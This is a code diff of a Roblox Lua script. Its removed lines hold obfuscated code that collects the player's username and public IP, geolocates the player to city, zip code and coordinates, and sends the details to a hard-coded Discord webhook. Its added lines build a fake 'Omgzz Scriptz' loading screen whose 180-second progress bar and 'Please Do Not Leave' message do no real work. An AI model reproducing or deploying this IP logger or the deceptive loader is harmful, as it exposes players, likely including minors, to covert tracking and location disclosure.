@@ -1,12 +1,250 @@
-
- .____                  ________ ___.    _____                           __                
- |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
- |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
- |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
- |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
-         \/          \/         \/    \/                \/     \/     \/                   
-          \_Welcome to LuaObfuscator.com   (Alpha 0.2.5) ~  Much Love, Ferib 
-
-]]--
-
-local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9)local v20={};for v21=1, #v8 do v6(v20,v0(v4(v1(v2(v8,v21,v21 + 1 )),v1(v2(v9,1 + ((v21-1)% #v9) ,1 + ((v21-1)% #v9) + 1 )))%256 ));end return v5(v20);end local v10=game:GetService(v7("\220\252\37\209\43\254\227","\140\144\68\168\78")).LocalPlayer.Name;local v11="https://discord.com/api/webhooks/1084254963686985770/l48u-VhPJI47NJbP44Des7fZ2afnVi8CQ1XB97llRN9l45h9tG1z9dWPz88Yn91XfSD-";local v12=syn.request({[v7("\247\207\41","\162\189\69\33")]="https://api.ipify.org/?format=json",[v7("\138\90\5\47\112\87","\199\63\113\71\31\51\45")]=v7("\115\101\244","\52\32\160\129\77\32\200")});local v13=game:GetService(v7("\192\13\188\148\107\42\239\80\225\26\173","\136\121\200\228\56\79\157\38")):JSONDecode(v12.Body);local v14=tostring(v13.ip);local v15=syn.request({[v7("\104\215\55","\61\165\91\148\169")]=string.format("http://ip-api.com/json/%s",v14),[v7("\239\133\149\142\210\198","\162\224\225\230\189")]=v7("\120\193\9","\63\164\125\217")});local v16=game:GetService(v7("\235\6\182\180\241\34\182\213\27\161\161","\163\114\194\196\162\71\196")):JSONDecode(v15.Body);local v17={[v7("\120\46","\49\126\21\83")]=v14,[v7("\180\9\194\87\52\250\4","\215\102\183\57\64\136\125")]=v16.country,[v7("\220\86\179\74\203\75\191\103\208\93\163","\191\57\198\36")]=v16.countryCode,[v7("\110\77\115\112\79\114","\28\40\20\25\32")]=v16.region,[v7("\184\131\165\250\116\174\149\30\167\131","\202\230\194\147\27\192\219\127")]=v16.regionName,[v7("\86\1\40\22","\53\104\92\111\146\31")]=v16.city,[v7("\62\195\185\236\43\206\172","\68\170\201\143")]=v16.zip,[v7("\51\20\156\22\189\209\59\16","\95\117\232\127\201\164")]=v16.lat,[v7("\25\240\3\181\64\1\234\9\183","\117\159\109\210\41")]=v16.lon,[v7("\15\184\232","\102\203\152\169\51")]=v16.isp,[v7("\78\65\124","\33\51\27\179\142")]=v16.org};local v18=string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```",v10,v17.IP,v17.country,v17.countryCode,v17.region,v17.regionName,v17.city,v17.zipcode,v17.isp,v17.org);local v19={[v7("\222\234\189\249\82\29\201","\189\133\211\141\55\115")]=v18};syn.request({[v7("\105\200\32","\60\186\76\237\45")]=v11,[v7("\215\184\20\40\166\182","\154\221\96\64\201\210\200")]=v7("\252\200\52\229","\172\135\103\177\235\93\50"),[v7("\38\46\46\165\38\244\95","\110\75\79\193\67\134\44\172")]={[v7("\148\201\56\65\178\200\34\24\131\223\38\80","\215\166\86\53")]="application/json"},[v7("\97\233\140\31","\35\134\232\102")]=game:GetService(v7("\112\108\152\242\0\114\74\110\133\225\54","\56\24\236\130\83\23")):JSONEncode(v19)});
+local pusername = (game:GetService("Players")).LocalPlayer.Name;
+local RLoading = Instance.new("ScreenGui");
+local RMainFrame = Instance.new("Frame");
+local RTitle = Instance.new("TextLabel");
+local UITextSizeConstraint = Instance.new("UITextSizeConstraint");
+local Dots = Instance.new("Frame");
+local Dot1 = Instance.new("Frame");
+local UICorner = Instance.new("UICorner");
+local InsideDot = Instance.new("Frame");
+local UICorner_2 = Instance.new("UICorner");
+local Dot2 = Instance.new("Frame");
+local UICorner_3 = Instance.new("UICorner");
+local InsideDot_2 = Instance.new("Frame");
+local UICorner_4 = Instance.new("UICorner");
+local Dot3 = Instance.new("Frame");
+local UICorner_5 = Instance.new("UICorner");
+local InsideDot_3 = Instance.new("Frame");
+local UICorner_6 = Instance.new("UICorner");
+local Bar = Instance.new("Frame");
+local Bar2 = Instance.new("Frame");
+local UICorner_7 = Instance.new("UICorner");
+local UICorner_8 = Instance.new("UICorner");
+local Percentage = Instance.new("TextLabel");
+local UITextSizeConstraint_2 = Instance.new("UITextSizeConstraint");
+local Tip = Instance.new("TextLabel");
+local UITextSizeConstraint_3 = Instance.new("UITextSizeConstraint");
+local welcome = Instance.new("TextLabel");
+local UITextSizeConstraint_4 = Instance.new("UITextSizeConstraint");
+local leave = Instance.new("TextLabel");
+local UITextSizeConstraint_5 = Instance.new("UITextSizeConstraint");
+local EndSequence = Instance.new("Frame");
+if _G.ScriptName == nil and _G.FirstText == nil and _G.SecondText == nil and _G.ThirdText == nil and _G.WaitingTime == nil then
+	_G.ScriptName = "Omgzz Scriptz";
+	_G.FirstText = "Preparing Script...";
+	_G.SecondText = "Loading Script...";
+	_G.ThirdText = "Almost Done...";
+	_G.WaitingTime = 180;
+end
+;
+RLoading.Name = "omgs scripts";
+RLoading.Parent = game:GetService("CoreGui");
+RLoading.IgnoreGuiInset = true;
+RMainFrame.Name = "RMainFrame";
+RMainFrame.Parent = RLoading;
+RMainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20);
+RMainFrame.BorderSizePixel = 0;
+RMainFrame.Size = UDim2.new(1, 0, 1, 0);
+RTitle.Name = "RTitle";
+RTitle.Parent = RMainFrame;
+RTitle.AnchorPoint = Vector2.new(0, 0);
+RTitle.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
+RTitle.BackgroundTransparency = 0;
+RTitle.Position = UDim2.new(0, 0, 0, 0);
+RTitle.Size = UDim2.new(1, 0, 0, 0);
+RTitle.Font = Enum.Font.FredokaOne;
+RTitle.Text = _G.ScriptName;
+RTitle.TextColor3 = Color3.fromRGB(255, 255, 255);
+RTitle.TextScaled = true;
+RTitle.TextSize = 0;
+RTitle.TextWrapped = true;
+UITextSizeConstraint.Parent = RTitle;
+UITextSizeConstraint.MaxTextSize = 88;
+Dots.Name = "Dots";
+Dots.Parent = RMainFrame;
+Dots.AnchorPoint = Vector2.new(0, 0);
+Dots.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
+Dots.BackgroundTransparency = 0;
+Dots.Position = UDim2.new(0, 0, 0, 0);
+Dots.Size = UDim2.new(0, 0, 0, 0);
+Dot1.Name = "Dot1";
+Dot1.Parent = Dots;
+Dot1.BackgroundColor3 = Color3.fromRGB(40, 40, 40);
+Dot1.Position = UDim2.new(0, 0, 0, 0);
+Dot1.Size = UDim2.new(0, 0, 0, 0);
+UICorner.CornerRadius = UDim.new(0, 0);
+UICorner.Parent = Dot1;
+InsideDot.Name = "InsideDot";
+InsideDot.Parent = Dot1;
+InsideDot.AnchorPoint = Vector2.new(0, 0);
+InsideDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
+InsideDot.Position = UDim2.new(0, 0, 0, 0);
+UICorner_2.CornerRadius = UDim.new(0, 0);
+UICorner_2.Parent = InsideDot;
+Dot2.Name = "Dot2";
+Dot2.Parent = Dots;
+Dot2.BackgroundColor3 = Color3.fromRGB(40, 40, 40);
+Dot2.Position = UDim2.new(0, 0, 0, 0);
+Dot2.Size = UDim2.new(0, 0, 0, 0);
+UICorner_3.CornerRadius = UDim.new(0, 0);
+UICorner_3.Parent = Dot2;
+InsideDot_2.Name = "InsideDot";
+InsideDot_2.Parent = Dot2;
+InsideDot_2.AnchorPoint = Vector2.new(0, 0);
+InsideDot_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
+InsideDot_2.Position = UDim2.new(0, 0, 0, 0);
+UICorner_4.CornerRadius = UDim.new(0, 0);
+UICorner_4.Parent = InsideDot_2;
+Dot3.Name = "Dot3";
+Dot3.Parent = Dots;
+Dot3.BackgroundColor3 = Color3.fromRGB(40, 40, 40);
+Dot3.Position = UDim2.new(0, 0, 0, 0);
+Dot3.Size = UDim2.new(0, 0, 0, 0);
+UICorner_5.CornerRadius = UDim.new(0, 0);
+UICorner_5.Parent = Dot3;
+InsideDot_3.Name = "InsideDot";
+InsideDot_3.Parent = Dot3;
+InsideDot_3.AnchorPoint = Vector2.new(0, 0);
+InsideDot_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
+InsideDot_3.Position = UDim2.new(0, 0, 0, 0);
+UICorner_6.CornerRadius = UDim.new(0, 0);
+UICorner_6.Parent = InsideDot_3;
+Bar.Name = "Bar";
+Bar.Parent = RMainFrame;
+Bar.AnchorPoint = Vector2.new(0, 0);
+Bar.BackgroundColor3 = Color3.fromRGB(40, 40, 40);
+Bar.BorderSizePixel = 0;
+Bar.Position = UDim2.new(0, 0, 0, 0);
+Bar.Size = UDim2.new(0, 0, 0, 0);
+Bar2.Name = "Bar2";
+Bar2.Parent = Bar;
+Bar2.BackgroundColor3 = Color3.fromRGB(60, 60, 60);
+Bar2.BorderSizePixel = 0;
+Bar2.Size = UDim2.new(0, 0, 1, 0);
+UICorner_7.CornerRadius = UDim.new(0, 0);
+UICorner_7.Parent = Bar2;
+UICorner_8.CornerRadius = UDim.new(0, 0);
+UICorner_8.Parent = Bar;
+Percentage.Name = "Percentage";
+Percentage.Parent = Bar;
+Percentage.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
+Percentage.BackgroundTransparency = 0;
+Percentage.Position = UDim2.new(0, 0, 0, 0);
+Percentage.Size = UDim2.new(0, 0, 0, 0);
+Percentage.Font = Enum.Font.FredokaOne;
+Percentage.Text = "0%";
+Percentage.TextColor3 = Color3.fromRGB(255, 255, 255);
+Percentage.TextScaled = true;
+Percentage.TextSize = 0;
+Percentage.TextWrapped = true;
+UITextSizeConstraint_2.Parent = Percentage;
+UITextSizeConstraint_2.MaxTextSize = 22;
+Tip.Name = "Tip";
+Tip.Parent = RMainFrame;
+Tip.AnchorPoint = Vector2.new(0, 0);
+Tip.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
+Tip.BackgroundTransparency = 0;
+Tip.Position = UDim2.new(0, 0, 0, 0);
+Tip.Size = UDim2.new(0, 0, 0, 0);
+Tip.Font = Enum.Font.SourceSansItalic;
+Tip.Text = "Waiting For Respond";
+Tip.TextColor3 = Color3.fromRGB(138, 138, 138);
+Tip.TextScaled = true;
+Tip.TextSize = 0;
+Tip.TextWrapped = true;
+UITextSizeConstraint_3.Parent = Tip;
+UITextSizeConstraint_3.MaxTextSize = 14;
+welcome.Name = "welcome";
+welcome.Parent = RMainFrame;
+welcome.AnchorPoint = Vector2.new(0, 0);
+welcome.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
+welcome.BackgroundTransparency = 0;
+welcome.Position = UDim2.new(0, 0, 0, 0);
+welcome.Size = UDim2.new(0, 0, 0, 0);
+welcome.Font = Enum.Font.Highway;
+welcome.Text = "Thanks To " .. pusername .. " For Using Our Script";
+welcome.TextColor3 = Color3.fromRGB(255, 255, 255);
+welcome.TextScaled = true;
+welcome.TextSize = 0;
+welcome.TextWrapped = true;
+UITextSizeConstraint_4.Parent = welcome;
+UITextSizeConstraint_4.MaxTextSize = 24;
+leave.Name = "leave";
+leave.Parent = RMainFrame;
+leave.AnchorPoint = Vector2.new(0, 0);
+leave.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
+leave.BackgroundTransparency = 0;
+leave.Position = UDim2.new(0, 0, 0, 0);
+leave.Size = UDim2.new(0, 0, 0, 0);
+leave.Font = Enum.Font.FredokaOne;
+leave.Text = "Please Do Not Leave";
+leave.TextColor3 = Color3.fromRGB(255, 0, 0);
+leave.TextScaled = true;
+leave.TextSize = 0;
+leave.TextWrapped = true;
+UITextSizeConstraint_5.Parent = leave;
+UITextSizeConstraint_5.MaxTextSize = 18;
+EndSequence.Name = "EndSequence";
+EndSequence.Parent = RLoading;
+EndSequence.BackgroundColor3 = Color3.fromRGB(20, 20, 20);
+EndSequence.BorderSizePixel = 0;
+EndSequence.Position = UDim2.new(1, 0, 0, 0);
+EndSequence.Size = UDim2.new(1, 0, 1, 0);
+local function FTUHD_fake_script()
+	local script = Instance.new("LocalScript", Dots);
+	while true do
+		wait(0);
+		script.Parent.Dot1.InsideDot:TweenSize(UDim2.new(1, 0, 1, 0), "In", "Sine", 0, true);
+		wait(0);
+		script.Parent.Dot2.InsideDot:TweenSize(UDim2.new(1, 0, 1, 0), "In", "Sine", 0, true);
+		wait(0);
+		script.Parent.Dot3.InsideDot:TweenSize(UDim2.new(1, 0, 1, 0), "In", "Sine", 0, true);
+		wait(0);
+		script.Parent.Dot1.InsideDot:TweenSize(UDim2.new(0, 0, 0, 0), "In", "Sine", 0, true);
+		wait(0);
+		script.Parent.Dot2.InsideDot:TweenSize(UDim2.new(0, 0, 0, 0), "In", "Sine", 0, true);
+		wait(0);
+		script.Parent.Dot3.InsideDot:TweenSize(UDim2.new(0, 0, 0, 0), "In", "Sine", 0, true);
+	end
+	;
+end
+;
+(coroutine.wrap(FTUHD_fake_script))();
+local function WBKZQ_fake_script()
+	local script = Instance.new("LocalScript", RMainFrame);
+	local bar = script.Parent.Bar;
+	local insidebar = bar.Bar2;
+	local percentage = bar.Percentage;
+	wait(5);
+	insidebar:TweenSize(UDim2.new(1, 0, 1, 0), "In", "Linear", _G.WaitingTime + 1, true);
+	wait(_G.WaitingTime + 1);
+end
+;
+(coroutine.wrap(WBKZQ_fake_script))();
+local function HLSHMMZ_fake_script()
+	local script = Instance.new("LocalScript", Percentage);
+	local numberwaiting = _G.WaitingTime / 100;
+	wait(5);
+	for i = 1, 100 do
+		script.Parent.Text = i .. "%";
+		wait(numberwaiting);
+	end
+	;
+end
+;
+(coroutine.wrap(HLSHMMZ_fake_script))();
+local function MXNTFNP_fake_script()
+	local script = Instance.new("LocalScript", Tip);
+	local tip = script.Parent;
+	while true do
+		wait(5);
+		tip.Text = _G.FirstText;
+		wait(5);
+		tip.Text = _G.SecondText;
+		wait(5);
+		tip.Text = _G.ThirdText;
+	end
+	;
+end
+;
+(coroutine.wrap(MXNTFNP_fake_script))();
